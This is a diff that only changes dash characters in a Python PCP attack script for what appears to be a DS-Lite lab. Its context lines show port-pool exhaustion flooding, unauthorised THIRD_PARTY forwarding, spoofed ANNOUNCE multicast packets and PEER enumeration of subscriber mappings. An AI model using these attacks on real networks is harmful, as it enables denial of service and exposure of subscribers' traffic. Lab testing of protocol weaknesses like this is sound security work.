@@ -1,8 +1,8 @@
 #!/usr/bin/python
-# T7 – PCP Port Exhaustion DoS
-# T8 – Unauthorized THIRD_PARTY Forwarding
-# T9 – PCP ANNOUNCE Spoofing (epoch reset attack)
-# T10 – PCP PEER Abuse (external address enumeration)
+# T7 - PCP Port Exhaustion DoS
+# T8 - Unauthorized THIRD_PARTY Forwarding
+# T9 - PCP ANNOUNCE Spoofing (epoch reset attack)
+# T10 - PCP PEER Abuse (external address enumeration)
 #
 # PCP (Port Control Protocol, RFC 6887) manages port mappings on the AFTR.
 # The DS-Lite lab uses PCP in "plain mode" (draft-ietf-pcp-dslite-00):
@@ -12,9 +12,9 @@
 #   - AFTR creates nftables DNAT rule and returns external port
 #
 # RFC 6887 defines three opcodes, all applicable to DS-Lite:
-#   MAP      (1) – create/refresh/delete explicit inbound port mappings
-#   PEER     (2) – learn/control external IP:port for outbound flows
-#   ANNOUNCE (0) – epoch advertisement; clients use for restart recovery
+#   MAP      (1) - create/refresh/delete explicit inbound port mappings
+#   PEER     (2) - learn/control external IP:port for outbound flows
+#   ANNOUNCE (0) - epoch advertisement; clients use for restart recovery
 #
 # PCP options: THIRD_PARTY (1), PREFER_FAILURE (2), FILTER (3)
 #
@@ -59,8 +59,8 @@ def _sigterm_handler(signum, frame):
     raise KeyboardInterrupt()
 signal.signal(signal.SIGTERM, _sigterm_handler)
 
-PCP_PORT          = 5351   # RFC 6887 §7.1 — server port (clients send requests here)
-PCP_MULTICAST_PORT = 5350  # RFC 6887 §8.5 — client port for unsolicited multicast ANNOUNCE
+PCP_PORT          = 5351   # RFC 6887 §7.1 - server port (clients send requests here)
+PCP_MULTICAST_PORT = 5350  # RFC 6887 §8.5 - client port for unsolicited multicast ANNOUNCE
 PCP_VERSION = 2
 PCP_OP_ANNOUNCE = 0
 PCP_OP_MAP = 1
@@ -190,7 +190,7 @@ def send_pcp_request(proxy_ip, pkt, timeout=3):
     proxy_ip may be either an IPv4 (B4 PCP proxy, LAN attacker path) or an
     IPv6 address (direct-to-AFTR path, ISP attacker). The socket family is
     selected automatically. When going direct-to-AFTR, the B4 PCP proxy is
-    bypassed — so its THIRD_PARTY-stripping defence (b4/pcp_proxy.py) no
+    bypassed - so its THIRD_PARTY-stripping defence (b4/pcp_proxy.py) no
     longer applies and the attacker's own THIRD_PARTY option reaches the
     AFTR PCP server verbatim. This is the realistic ISP-side attack path
     for T7/T8/T10.
@@ -222,12 +222,12 @@ def worker_exhaust(proxy_ip, proto, count, third_party_prefix=None, idx=0,
 
     When the AFTR PCP server processes a MAP request it needs a real IPv4
     internal address to build the DNAT rule. In direct-to-AFTR (ISP) mode
-    the server would otherwise fall back to the attacker's IPv6 source —
+    the server would otherwise fall back to the attacker's IPv6 source -
     which makes nft reject the rule. To reliably consume pool ports we
     pass a THIRD_PARTY option pointing at a per-worker rotating inner
     IPv4 drawn from `third_party_prefix` (e.g. 10.0.0.0/16).
 
-    fire_and_forget: skip response read, keep socket reused — 5×-10× throughput.
+    fire_and_forget: skip response read, keep socket reused - 5×-10× throughput.
     """
     is_v6 = ':' in proxy_ip
     fam = socket.AF_INET6 if is_v6 else socket.AF_INET
@@ -284,7 +284,7 @@ def worker_exhaust(proxy_ip, proto, count, third_party_prefix=None, idx=0,
 
 def run_exhaust(args):
     """T7: Flood PCP MAP requests to exhaust port pool."""
-    print(f"[*] T7 – PCP Port Exhaustion DoS")
+    print(f"[*] T7 - PCP Port Exhaustion DoS")
     print(f"[*] Target PCP proxy: {args.proxy_ip}:{PCP_PORT}")
     print(f"[*] Sending {args.count} MAP requests via {args.threads} threads")
     print(f"[*] Protocol: {'TCP' if args.proto == 6 else 'UDP'}")
@@ -341,7 +341,7 @@ def run_exhaust(args):
     print()
     print("Verify on AFTR ns:")
     print("  nft list chain ip nat pcp_dnat | wc -l  # DNAT rules added")
-    print("  # Try a legitimate MAP request from client1 – should get NO_RESOURCES")
+    print("  # Try a legitimate MAP request from client1 - should get NO_RESOURCES")
 
     print(f"[+] Sent {stats['sent']} PCP MAP requests, {stats['success']} mappings created")
 
@@ -350,7 +350,7 @@ def run_exhaust(args):
 
 def run_third_party(args):
     """T8: Create port mapping directing traffic to arbitrary internal IP."""
-    print(f"[*] T8 – Unauthorized THIRD_PARTY PCP Forwarding")
+    print(f"[*] T8 - Unauthorized THIRD_PARTY PCP Forwarding")
     print(f"[*] Target proxy: {args.proxy_ip}:{PCP_PORT}")
     print(f"[*] Target internal host: {args.target_internal}")
     print()
@@ -422,7 +422,7 @@ def run_announce_spoof(args):
     from scapy.layers.l2 import Ether
     from scapy.sendrecv import sendp
 
-    print(f"[*] T9 – PCP ANNOUNCE Spoofing (epoch reset attack)")
+    print(f"[*] T9 - PCP ANNOUNCE Spoofing (epoch reset attack)")
     print(f"[*] Interface: {args.interface}")
     print(f"[*] Spoofing AFTR address: {args.aftr_ip6}")
     print()
@@ -463,7 +463,7 @@ def run_announce_spoof(args):
         pkt = (
             Ether(src=src_mac, dst="33:33:00:00:00:01") /
             IPv6(src=args.aftr_ip6, dst="ff02::1") /
-            # RFC 6887 §8.5 — server sends unsolicited multicast ANNOUNCE
+            # RFC 6887 §8.5 - server sends unsolicited multicast ANNOUNCE
             # FROM its server port 5351 TO the client listening port 5350.
             IPv6UDP(sport=PCP_PORT, dport=PCP_MULTICAST_PORT) /
             announce_resp
@@ -560,7 +560,7 @@ def run_peer_abuse(args):
       - Pre-attack reconnaissance for downstream PCP attacks
       - Information disclosure: subscriber activity visible to attacker
     """
-    print(f"[*] T10 – PCP PEER Abuse (external address enumeration)")
+    print(f"[*] T10 - PCP PEER Abuse (external address enumeration)")
     print(f"[*] Target proxy: {args.proxy_ip}:{PCP_PORT}")
     print(f"[*] Target internal: {args.target_internal}")
     print(f"[*] Scanning ports: {args.scan_ports}")
@@ -590,8 +590,8 @@ def run_peer_abuse(args):
     # conntrack table for ANY of the THIRD_PARTY-claimed internal IP's flows
     # and returns the NAT-assigned external port of the first match. This
     # discovers an active mapping with NO knowledge of the victim's ephemeral
-    # source port — the realistic enumeration primitive (see T10).
-    print("[*] wildcard probe (int_port=0) — zero-knowledge mapping discovery")
+    # source port - the realistic enumeration primitive (see T10).
+    print("[*] wildcard probe (int_port=0) - zero-knowledge mapping discovery")
     wpkt = build_pcp_peer_request(
         os.urandom(12), args.proto, 0, remote_ip, remote_port,
         lifetime=600, third_party_ip4=args.target_internal)
@@ -695,7 +695,7 @@ def run_map(args):
 
 def main():
     p = argparse.ArgumentParser(
-        description="T7/T8/T9 (+ T10 peer) – PCP Security Attacks\n"
+        description="T7/T8/T9 (+ T10 peer) - PCP Security Attacks\n"
                     "Targets the PCP Port Control Protocol (RFC 6887) in DS-Lite.\n"
                     "RFC 6887 opcodes: MAP(1), PEER(2), ANNOUNCE(0)",
         formatter_class=argparse.RawDescriptionHelpFormatter
@@ -707,14 +707,14 @@ def main():
     e.add_argument('--proxy-ip', default='10.0.1.1',
                    help='B4 PCP proxy IPv4 (default: 10.0.1.1)')
     e.add_argument('--count', type=int, default=30000,
-                   help='Number of MAP requests (default: 30000 — enough to '
+                   help='Number of MAP requests (default: 30000 - enough to '
                         'saturate the 64512-port PCP pool with fire-and-forget)')
     e.add_argument('--threads', type=int, default=4,
                    help='Threads (default: 4)')
     e.add_argument('--proto', type=int, default=17, choices=[6, 17],
                    help='IP protocol 6=TCP 17=UDP (default: 17)')
     e.add_argument('--fire-and-forget', action='store_true',
-                   help='Skip response wait (5-10x throughput) — recommended '
+                   help='Skip response wait (5-10x throughput) - recommended '
                         'for direct-to-AFTR pool exhaustion')
 
     # T8
